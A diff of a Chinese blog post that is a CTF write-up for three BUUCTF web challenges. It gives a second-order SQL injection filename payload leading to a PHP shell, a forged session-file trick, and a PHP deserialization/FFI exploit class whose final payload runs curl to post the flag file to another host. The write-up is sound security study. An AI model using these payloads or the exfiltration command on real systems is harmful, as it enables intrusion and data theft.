@@ -7,17 +7,41 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>Archives: 2019/10 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
+  <title>buuctf-wp-6 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta property="og:type" content="website">
-<meta property="og:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
-<meta property="og:url" content="https://glotozz.github.io/archives/2019/10/page/2/index.html">
+  <meta name="description" content="菜">
+<meta name="keywords" content="ctf,wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-wp-6">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/11/buuctf-wp-6/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
+<meta property="og:description" content="菜">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/CJDEuQZBiYcS6e1.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/WzvYwOTgtU8PfbM.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/HKnBAitFG9hYsgf.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/43R6GHYmahu1wIX.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/knqbfEWDC87Gmrz.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/rbTEMcCO5LgPUns.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/8KNamwnWQYjeUD1.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/67Ut1LA8GRCwq4P.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/11/ledWxyZrcn3mICN.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/RBtPeKi72T4E16W.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/KhxDUP8FAsg1NE2.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/1mMq6zYrspofCZ2.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/YntE5aCpeg4l87k.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/HnSR9iB1modCXwF.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/mgiJqz2aODG8yIY.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/peqRTvICtjDFk4b.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/efMVNopTd5yjtcK.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/12/ERmO9S4sX6rQFMa.png">
+<meta property="og:updated_time" content="2019-11-12T13:58:00.841Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
+<meta name="twitter:title" content="buuctf-wp-6">
+<meta name="twitter:description" content="菜">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/11/CJDEuQZBiYcS6e1.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -149,272 +173,306 @@
           </div>
           <div id="js-content" class="content-ll">
             
+<article id="post-buuctf-wp-6" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      buuctf-wp-6
+    </h1>
   
+
+        
+        <a href="/2019/11/11/buuctf-wp-6/" class="archive-article-date">
+  	<time datetime="2019-11-11T08:25:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
+</a>
+        
+      </header>
     
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>菜</strong></p>
+<meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<h3 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h3><p>简单尝试后没啥思路。。。看了wp应该是存在源码泄露的</p>
+<p><code>www.tar.gz</code>泄露，一般源码比较多的都是这类的泄露</p>
+<p>这题是二次注入+rename从而getshell</p>
+<p><code>delete.php</code>也存在二次注入，但是无法geishell</p>
+<p><code>rename.php</code></p>
+<p><img src="https://i.loli.net/2019/11/11/CJDEuQZBiYcS6e1.png" alt="Snipaste_2019-11-11_18-51-08.png"></p>
+<p>只需要在<code>$oldname</code>先插入要注入的语句，造成update注入</p>
+<p>最后是拼接相同的从数据库取出来的后缀，有个小坑是<code>if(file_exist($oldname)){</code>，在前台再上传一个即可，一开始想把extension改成php，但是这样前台无法上传，只能把extension设为空，通过控制filename和newname直接修改想要的后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` set `filename`=&apos;xxx&apos;, `oldname`=&apos;test.jpg&apos;,`extension`=&apos;&apos;#&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以传的文件名为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.jpg&apos;,`extension`=&apos;&apos;#.jpg</span><br></pre></td></tr></table></figure>
+
+<p>rename构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oldname=test.jpg&apos;,`extension`=&apos;&apos;#</span><br><span class="line">newname=test.jpg</span><br></pre></td></tr></table></figure>
+
+<p>此时数据库</p>
+<p><img src="https://i.loli.net/2019/11/11/WzvYwOTgtU8PfbM.png" alt="Snipaste_2019-11-11_19-39-37.png"></p>
+<p>再次rename，需要先上传个test.jpg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oldname=test.jpg</span><br><span class="line">newname=aa.php</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://i.loli.net/2019/11/11/HKnBAitFG9hYsgf.png" alt="Snipaste_2019-11-11_19-41-15.png"></p>
+<h3 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h3><p><code>?page=login</code>很容易联想到filter协议读取源码，但是没读到源码，😂，wp里说是作为附件提供源码。。。。</p>
+<p>下载提供的源码：<a href="https://github.com/st98/harekaze-ctf-2019/blob/master/easy_notes/attachments/easy-notes.tar.xz?raw=true" target="_blank" rel="noopener">https://github.com/st98/harekaze-ctf-2019/blob/master/easy_notes/attachments/easy-notes.tar.xz?raw=true</a></p>
+<p>先看<code>pages/flag.php</code></p>
+<p><img src="https://i.loli.net/2019/11/11/43R6GHYmahu1wIX.png" alt="Snipaste_2019-11-11_21-41-38.png"></p>
+<p>跟踪<code>is_admin()</code></p>
+<p><img src="https://i.loli.net/2019/11/11/knqbfEWDC87Gmrz.png" alt="Snipaste_2019-11-11_21-42-19.png"></p>
+<p>再去<code>login.php</code>看看</p>
+<p><img src="https://i.loli.net/2019/11/11/rbTEMcCO5LgPUns.png" alt="Snipaste_2019-11-11_21-43-28.png"></p>
+<p>追踪<code>validate_user()</code></p>
+<p><img src="https://i.loli.net/2019/11/11/8KNamwnWQYjeUD1.png" alt="Snipaste_2019-11-11_21-44-30.png"></p>
+<p>然后还有add Note和export Note，发现文件名的格式和session文件有点像，并且在同一目录下，就可以一条龙了</p>
+<p>session的默认序列化引擎是php</p>
+<p>那么构造如下生成一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[&apos;admin&apos;]=true;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|b:1;</span><br></pre></td></tr></table></figure>
+
+<p>然后是需要得到session文件名，首先构造文件名</p>
+<p><img src="https://i.loli.net/2019/11/11/67Ut1LA8GRCwq4P.png" alt="Snipaste_2019-11-11_22-26-44.png"></p>
+<p>我们使<code>get_user()</code>为<code>sess_</code>，<code>$type</code>为<code>.</code>，即可使文件名满足session文件名要求</p>
+<p>分析写入的数据被导出的格式，</p>
+<p><img src="https://i.loli.net/2019/11/11/ledWxyZrcn3mICN.png" alt="Snipaste_2019-11-11_22-38-28.png"></p>
+<p>这里只要分析<code>addFromString(&quot;{$index}_{$title}.json&quot;, json_encode($note)</code>，从session得到的note数组进行json解码，猜测可能还是原来的字符串，根据wp传入<code>|N;admin|b:1;</code>， 用分号分隔。 本地看看究竟生成的是啥。。<strong>注意php版本和设置<code>TEMP_DIR</code></strong></p>
+<p><img src="https://i.loli.net/2019/11/12/RBtPeKi72T4E16W.png" alt="Snipaste_2019-11-12_07-54-10.png"></p>
+<p>读取的session</p>
+<p><img src="https://i.loli.net/2019/11/12/KhxDUP8FAsg1NE2.png" alt="Snipaste_2019-11-12_08-14-21.png"></p>
+<p>因此比如传入<code>|haha;admin|b:1;</code>应该也可以，结果不行。。</p>
+<p>试了几次似乎只能传入<code>|N;admin|b:1;</code>才能被正常解析为session，应该是解析的时候有格式限制，学！！！</p>
+<h3 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h3><p>打开页面就这么这么一段。。</p>
+<p><img src="https://i.loli.net/2019/11/12/1mMq6zYrspofCZ2.png" alt="Snipaste_2019-11-12_08-52-28.png"></p>
+<p>读取<code>phpinfo();</code></p>
+<p>是<code>PHP Version 7.4.0-dev</code></p>
+<p><img src="https://i.loli.net/2019/11/12/YntE5aCpeg4l87k.png" alt="Snipaste_2019-11-12_08-53-50.png"></p>
+<p><img src="https://i.loli.net/2019/11/12/HnSR9iB1modCXwF.png" alt="Snipaste_2019-11-12_08-56-44.png"></p>
+<p>尝试绕过<code>open_basedir()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&quot;/tmp/fuck&quot;);chdir(&quot;/tmp/fuck&quot;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(scandir(&apos;/&apos;));</span><br></pre></td></tr></table></figure>
+
+<p>发现完全不行，</p>
+<p><img src="https://i.loli.net/2019/11/12/mgiJqz2aODG8yIY.png" alt="Snipaste_2019-11-12_09-02-15.png"></p>
+<p>并未过滤<code>scandir()</code>，那么列一下网站目录，得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; preload.php )</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>file_get_contents()</code>读取<code>preload.php</code></p>
+<p><img src="https://i.loli.net/2019/11/12/peqRTvICtjDFk4b.png" alt="Snipaste_2019-11-12_09-12-58.png">)<img src="https://i.loli.net/2019/11/12/efMVNopTd5yjtcK.png" alt="Snipaste_2019-11-12_09-13-05.png"></p>
+<p>应该是反序列化，<code>unserialize()</code>没有被禁用，我们可以自己构造</p>
+<p><code>run()</code>方法中存在动态函数执行，我们只需要先<code>include</code>文件<code>preload.php</code>，再构造反序列化即可</p>
+<p>问题来了，想要执行的动态函数已经都被禁用了😥</p>
+<p>参考ROIS战队wp</p>
+<blockquote>
+<p><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">FFI扩展</a>可以实现任意代码执行。对于PHP，FFI开辟了一种在纯PHP中编写PHP扩展和绑定到C库的方法。 </p>
+<p> php.ini配置使用preload预加载与FFI扩展 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffi.enable = preload </span><br><span class="line">opcache.preload = preload.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在preload机制中，preload.php中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要include(‘preload.php’)文件 </p>
+</blockquote>
+<p>构造（参考wp）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &apos;int system(char *command);&apos;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        echo &quot;run&lt;br&gt;&quot;;</span><br><span class="line">        $this-&gt;data[&apos;ret&apos;] = $this-&gt;data[&apos;func&apos;]($this-&gt;data[&apos;arg&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&apos;No implemented&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        echo &quot;__construct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo base64_encode(serialize($a)); // 即payload</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里的EXP代码中删除了原有的 <code>__serialize</code> 、 <code>__unserialize</code> 两个函数，这是因为在反序列化时会触发 <code>__unserialize</code> 函数 </p>
+</blockquote>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=unserialize(base64_decode(&apos;QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319&apos;))-&gt;__serialize()[&apos;ret&apos;]-&gt;system(&apos;curl -d @/flag 174.0.0.158:1234&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>一开始用自己的vps接收，发现并没有结果。。。想起来靶机无法访问外网。。。</p>
+<p>搞个内网靶机即可</p>
+<p><img src="https://i.loli.net/2019/11/12/ERmO9S4sX6rQFMa.png" alt="Snipaste_2019-11-12_13-58-48.png"></p>
+<p>这题phpinfo时的关注点</p>
+<blockquote>
+<p>PHP Version 7.4.0-dev<br>内网IP：172.20.0.1<br>开启了FFI<br>opcache.preload：/var/www/html/preload.php<br>open_basedir：/var/www/html<br>disable_classes：ReflectionClass<br>disable_functions：xxxxxxxxx</p>
+</blockquote>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html</a> </p>
+<p><a href="https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB题解/#easy-notes" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#easy-notes</a> </p>
+<p><a href="https://xz.aliyun.com/t/6628#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/6628#toc-2</a> </p>
+<p><a href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-200-easy-notes" target="_blank" rel="noopener">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-200-easy-notes</a> </p>
+<p><a href="https://blog.csdn.net/qq_41809896/article/details/90384668" target="_blank" rel="noopener">https://blog.csdn.net/qq_41809896/article/details/90384668</a> </p>
+<p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web题解之nextphp/" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/</a> </p>
+
+      
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>glotozz</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2019/11/11/buuctf-wp-6/" target="_blank" title="buuctf-wp-6">https://glotozz.github.io/2019/11/11/buuctf-wp-6/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/06/ThinkPHP5-1反序列化复现/" class="archive-article-date">
-  	<time datetime="2019-10-06T01:57:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/06/ThinkPHP5-1反序列化复现/">ThinkPHP5.1反序列化复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/11/11/buuctf-wp-6/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/05/ThinkPHP5漏洞复现-4/" class="archive-article-date">
-  	<time datetime="2019-10-05T10:23:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-05</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/11/11/buuctf-wp-5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">buuctf-wp-5</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/05/ThinkPHP5漏洞复现-4/">ThinkPHP5漏洞复现-4</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/05/ThinkPHP5漏洞复现-3/" class="archive-article-date">
-  	<time datetime="2019-10-05T02:40:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/05/ThinkPHP5漏洞复现-3/">ThinkPHP5漏洞复现-3</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/04/ThinkPHP5漏洞复现-2/" class="archive-article-date">
-  	<time datetime="2019-10-04T04:03:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/ThinkPHP5漏洞复现-2/">ThinkPHP5漏洞复现-2</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/03/tp5入门/" class="archive-article-date">
-  	<time datetime="2019-10-02T23:53:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/03/tp5入门/">tp5入门</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/02/ThinkPHP5漏洞复现-1/" class="archive-article-date">
-  	<time datetime="2019-10-02T00:25:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/02/ThinkPHP5漏洞复现-1/">ThinkPHP5漏洞复现-1</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2019/10/">&laquo; Prev</a><a class="page-number" href="/archives/2019/10/">1</a><span class="page-number current">2</span>
-    </nav>
   
 
 
@@ -442,8 +500,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
